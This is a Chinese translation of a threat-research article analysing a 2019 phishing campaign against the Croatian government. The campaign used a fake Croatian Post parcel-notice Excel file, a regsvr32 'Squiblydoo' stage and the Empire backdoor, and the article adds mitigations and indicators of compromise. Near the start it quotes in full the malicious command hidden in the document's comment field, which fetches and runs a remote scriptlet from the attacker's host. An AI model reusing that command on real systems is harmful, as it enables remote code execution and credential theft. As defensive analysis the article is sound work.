**寻找新型以及危险的网络威胁是PT ESC安全中心的主要工作之一，2019年中旬，PT
ESC的分析人员发现了一起针对克罗地亚政府的网络攻击。在这篇文章中，我们将针对这一攻击活动进行分析，而且据我们所知，这种新型的攻击框架在此之前从未有人使用过。**

![](https://image.3001.net/images/20190827/1566896474_5d64f15a55d85.png!small)

##  感染链

2019年4月2日，在常规的恶意软件监控活动中，PT ESC的研究人员发现了一份可疑的Office文档：

![](https://image.3001.net/images/20190827/1566896484_5d64f1647588d.png!small)

这是一份excel文件，它伪装成了包裹通知，并存储为了旧版本的.xls格式（时间戳：2019-04-01 16:28:07
(UTC)）。然而，该文件的“上次打印”时间戳（2018-07-2500:12:30 (UTC)）表明该文档曾在2018年被使用过。

需要注意的是，文件的注释信息包含了Windows控制台命令：

    
    
    cmd.exe/c echo Set objShell = CreateObject("Wscript.Shell"): objShell.Run"net use [https://postahr.vip](https://postahr.vip/)", 0, False: Wscript.Sleep 10000:objShell.Run "regsvr32 /u /n /s /i:<https://postahr.vip/page/1/update.sctscrobj.dll>", 0, False: Set objShell = Nothing  >C:\users\%username%\appdata\local\microsoft\silent.vbs

![](https://image.3001.net/images/20190827/1566896648_5d64f208f3043.png!small)

![](https://image.3001.net/images/20190827/1566896653_5d64f20dc4ec4.png!small)

**这条命令会创建一个VB脚本，运行之后会执行下列任务：**

> 1、建立一条WebDAV网络连接；
>
> 2、下载并运行文件以备下一阶段的感染，需要借助合法的系统实用工具regsvr32。

在与攻击者的服务器建立了HTTP(S)连接之后，脚本会发送一个NTLM请求。这个请求可以用来恢复NTLM哈希来进行pass-the-hash攻击。

这种利用regsvr32来进行恶意攻击的技术被称为Squiblydoo，之前也有过相关介绍。攻击者可以使用它来绕过应用程序白名单，并躲避反病毒产品的检测。

注释参数的内容本身并不会进行什么操作，而是会触发其他操作。当目标用户打开Excel文档之后，会弹出一条信息来要求用户启用宏功能：

![](https://image.3001.net/images/20190827/1566896666_5d64f21a78fe6.png!small)

如果用户点击了“启用内容”按钮，则会弹出一条伪造的消息，其中包含Croatian Post的logo和包裹通知：

![](https://image.3001.net/images/20190827/1566896671_5d64f21fde040.png!small)

与此同时，恶意宏将运行文件注释中的命令，新的脚本将会添加到系统的启动项中：

![](https://image.3001.net/images/20190827/1566896678_5d64f22623e86.png!small)

有趣的是，这个新脚本并不是由恶意宏运行的，这很有可能是攻击者专门设计的，因为攻击者需要在重启并用户登录之后进行下一阶段的感染。需要注意的是，其中的代码结构非常好，缩进和格式都很整洁，并且从第三方源“借用”了一些代码。

![](https://image.3001.net/images/20190827/1566896683_5d64f22b2780d.png!small)

而且攻击者还从网上“抄袭”了一些代码，并进行了修改：

![](https://image.3001.net/images/20190827/1566896689_5d64f23155663.png!small)

![](https://image.3001.net/images/20190827/1566896694_5d64f23646b25.png!small)

![](https://image.3001.net/images/20190827/1566896698_5d64f23a7fc8f.png!small)

接下来，我们看看下一阶段攻击者如何使用regsvr32来实现感染。命令运行之后，会从攻击者的服务器下载一个JavaScriptscriptlet，Body中包含有Base64编码的数据。解码之后，数据会被反序列化，并由.NET框架运行。

![](https://image.3001.net/images/20190827/1566896900_5d64f304361d9.png!small)

这里的部分代码也是攻击者从网上“借鉴”过来的：

![](https://image.3001.net/images/20190827/1566896906_5d64f30a385eb.png!small)

![](https://image.3001.net/images/20190827/1566896910_5d64f30e9ed6c.png!small)

从表面上看，攻击者对所使用的工具并没有非常深刻的了解。比如说，scriptlet调用了setversion函数，但并没做任何其他的事情，在线提供的一个示例scriptlet也是如此。

解包并运行之后，代码会下载一个.NET可执行文件（PE文件）。

![](https://image.3001.net/images/20190827/1566896917_5d64f3152b0ed.png!small)

![](https://image.3001.net/images/20190827/1566896921_5d64f31987e99.png!small)

编译后，源代码文件夹的路径仍然存在。这里的-master后缀表明，这些代码是直接从代码库中克隆过来的。其中一个目录路径为SharpPick的组件，它可以用来下载并运行跟.NET有依赖关系的PowerShell代码，而不需要额外的代码解释器。

![](https://image.3001.net/images/20190827/1566896927_5d64f31f8e229.png!small)

反编译之后，我们得到了PowerShell脚本代码：

![](https://image.3001.net/images/20190827/1566896932_5d64f3245d278.png!small)

**这段代码会进行下列操作：**

> 1、创建一个对象来与Web服务器交互，包含User-Agent、Cookie和代理设置。
>
> 2、Payload会从上述地址中下载。
>
> 3、使用RC4密钥解码并运行下载下来的数据。

不幸的是，C2服务器在此时已经无法访问了，所以我们无法获取到之前的数据了。但是，调查结果显示这个感染链为Empire
Backdoor（输入Empire后渗透利用框架），它可以帮助攻击者远程控制目标用户的计算机。

![](https://image.3001.net/images/20190827/1566896944_5d64f330a66a2.png!small)

##  缓解方案

> 1、监控特定白名单应用程序的使用：certutil,regsvr32, msbuild, net, wmic。
>
> 2、扫描并分析邮件附件以及邮件中的链接。
>
> 3、定期扫描联网计算机的RAM。

##  入侵威胁指标IoC

> 0adb7204ce6bde667c5abd31e4dea164
>
> 13db33c83ee680e0a3b454228462e73f
>
> 78184cd55d192cdf6272527c62d2ff89
>
> 79e72899af1e50c18189340e4a1e46e0
>
> 831b08d0c650c8ae9ab8b4a10a199192
>
> 92530d1b546ddf2f0966bbe10771521f
>
> c84b7c871bfcd346b3246364140cd60f
>
> hxxps://postahr.vip/page/1/update.sct
>
> hxxps://posteitaliane.live/owa/mail/archive.srf
>
> hxxps://konzum.win/bat3.txt
>
> hxxp://198.46.182.158/bat3.txt
>
> hxxps://176.105.255.59:8089
>
> [\\\\]176.105.255.59\webdav\msbuild.xml
>
> postahr.online
>
> 176.105.254.52
>
> 93.170.105.32

 *** 参考来源：[ptsecurity](http://blog.ptsecurity.com/2019/07/ironpython-darkly-how-we-uncovered.html?m=1)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

  

